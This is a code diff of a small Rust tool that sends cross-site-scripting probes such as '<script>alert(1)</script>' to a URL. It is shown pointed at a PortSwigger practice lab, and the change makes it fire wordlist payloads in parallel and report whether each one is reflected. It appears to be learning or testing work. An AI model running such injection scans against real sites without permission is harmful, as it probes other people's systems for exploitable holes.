@@ -4,16 +4,39 @@
 
 // Dependencies
 use isahc::prelude::*; // 0.9.3
+use rayon::prelude::*; // 1.3.0
 use regex::Regex; // 1.3.9
+use std::fs::File;
+use std::io::{BufRead, BufReader};
 
-// Main
-fn main() -> Result<(), Box<dyn std::error::Error>> {
+// Read from file
+fn main() -> std::io::Result<()> {
+    let url = "https://portswigger-labs.net/xss/xss.php?x=$";
+    let wordlist = "default.txt";
+    let mut payloads: Vec<String> = Vec::new();
+    let fd = File::open(wordlist)?;
+    for payload in BufReader::new(fd).lines() {
+        let payload = payload.unwrap();
+        let payload = payload.trim().to_owned();
+        payloads.push(payload);
+    }
+    payloads
+        .par_iter()
+        .for_each(|url_path| match request(url, url_path) {
+            Ok(request) => request,
+            Err(e) => println!("{}", e),
+        });
+
+    Ok(())
+}
+
+// XSS
+fn request(host: &str, payload: &str) -> Result<(), Box<dyn std::error::Error>> {
+    // Config values
     let ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
-    let payload = "<script>alert(1)</script>";
-    let template = "https://portswigger-labs.net/xss/xss.php?x=$";
     // This regex below replaces $ with the payload
     let re = Regex::new("\\$").unwrap();
-    let url = re.replace(template, payload).to_string();
+    let url = re.replace(host, payload);
     let url = url_encode(&url);
     // Sends request
     let request = Request::get(url)
@@ -22,16 +45,15 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         .send()?
         .text()?;
 
-    let source = request.contains(payload);
-
+    let source = request.contains(payload); // Check if source code contains payload
     if source == true {
-        println!("Website is vulnerble");
-    } else {
-        println!("Website is not vulnerbale");
+        println!("Website is vulnerable!")
+    } else if source == false {
+        println!("Website is not vulnerble")
     }
+
     Ok(())
 }
-
 // Sanitizes URL
 fn url_encode(data: &str) -> String {
     fn str_to_ascii_num(char: &str) -> u8 {
